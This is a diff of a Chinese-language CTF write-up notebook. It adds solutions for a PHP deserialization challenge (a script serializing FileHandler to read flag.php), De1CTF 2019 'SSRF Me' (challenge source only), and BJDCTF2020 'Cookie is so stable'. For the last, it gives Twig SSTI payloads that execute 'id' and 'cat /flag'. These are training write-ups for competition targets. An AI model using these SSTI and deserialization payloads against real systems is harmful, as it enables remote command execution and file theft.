@@ -2795,9 +2795,9 @@ highlight_file(__FILE__);
 
 class FileHandler {
 
-    protected $op="2";
-    protected $filename="flag.php";
-    protected $content="aaa";
+    protected $op="1";
+    protected $filename="/tmp/tmpfile";
+    protected $content="Hello World!";
 
     function __construct() {
         $op = "1";
@@ -2831,7 +2831,7 @@ class FileHandler {
         }
     }
 
-    private function read() {
+    private function read() { //获取文件的内容
         $res = "";
         if(isset($this->filename)) {
             $res = file_get_contents($this->filename);
@@ -2845,7 +2845,7 @@ class FileHandler {
     }
 
     function __destruct() {
-        if($this->op === "2")
+        if($this->op === "2") //这里使用op=2绕过，这里的2是数字型，这样就不会执行write（）
             $this->op = "1";
         $this->content = "";
         $this->process();
@@ -2872,6 +2872,35 @@ if(isset($_GET{'str'})) {
 ~~~
 
 `__wakeup()`触发于`unserilize()`调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得`__wakeup`失效。
+
+开始代码审计，传递一个 `str`名称的参数，然后他被反序列化。代码中有个read（）函数，我们要让他执行去获取flag.php中的源码。
+
+$obj = unserialize($str);这句话执行的时候会调用 `__destruct()`方法，如果op==='2'就会置为1，从而执行write（）方法，这并不我们所希望的，我们希望执行read（），这里可以使用op=2(数字型绕过)
+
+payload：对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。
+
+~~~php
+<?php
+highlight_file(__FILE__);
+	class FileHandler {
+        public $op = 2;
+        public $filename = "flag.php";
+        public $content;
+    }
+    $a = new FileHandler();
+        $b = serialize($a);
+        echo($b);
+?>
+
+~~~
+
+![image-20210525193154240](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193154240.png)
+
+
+
+
+
+
 
 ### [MRCTF2020]你传你🐎呢
 
@@ -3619,3 +3648,159 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:
 直接读取/flag文件，获取flag值
 
 ![image-20210524203643801](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203643801.png)
+
+### [De1CTF 2019]SSRF Me
+
+![image-20210525172355395](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525172355395.png)
+
+进入网站是一段python代码，用的是Flask框架，不太熟悉
+
+~~~python
+#! /usr/bin/env python
+# #encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
+ 
+app = Flask(__name__)
+ 
+secert_key = os.urandom(16)
+ 
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):
+            os.mkdir(self.sandbox)
+ 
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if "scan" in self.action:
+                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == "Connection Timeout"):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if "read" in self.action:
+                f = open("./%s/result.txt" % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = "Action Error"
+        else:
+            result['code'] = 500
+            result['msg'] = "Sign Error"
+        return result
+ 
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+ 
+@app.route("/geneSign", methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return getSign(action, param)
+ 
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get("action"))
+    param = urllib.unquote(request.args.get("param", ""))
+    sign = urllib.unquote(request.cookies.get("sign"))
+    ip = request.remote_addr
+    if(waf(param)):
+        return "No Hacker!!!!"
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+ 
+@app.route('/')
+def index():
+    return open("code.txt","r").read()
+ 
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return "Connection Timeout"
+ 
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+ 
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+ 
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith("gopher") or check.startswith("file"):
+        return True
+    else:
+        return False
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0',port=9999)
+~~~
+
+![image-20210525181241873](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525181241873.png)
+
+
+
+![image-20210525181210108](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525181210108.png)
+
+### [BJDCTF2020]Cookie is so stable
+
+![image-20210525193459349](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193459349.png)
+
+查看hint.php源码,说明cookie中有信息
+
+![image-20210525193643238](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193643238.png)
+
+抓包，发现cookie中有user字段，试了一下并不是SQL注入，怀疑是SSTI，发现了异常
+
+![image-20210525194729947](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525194729947.png)
+
+看来是SSTI,但是代码做了过滤，自己对SSTI也不太熟悉，看看别人的WP
+
+在user处尝试注入
+
+{{7\*'7'}} 回显7777777 ==> Jinja2
+{{7\*'7'}} 回显49 ==> Twig 
+
+ 
+
+这里为Twig
+
+
+payload
+
+~~~ 
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+~~~
+
+获取flag
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+```
+
+
+
+![image-20210525201813511](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525201813511.png)
+
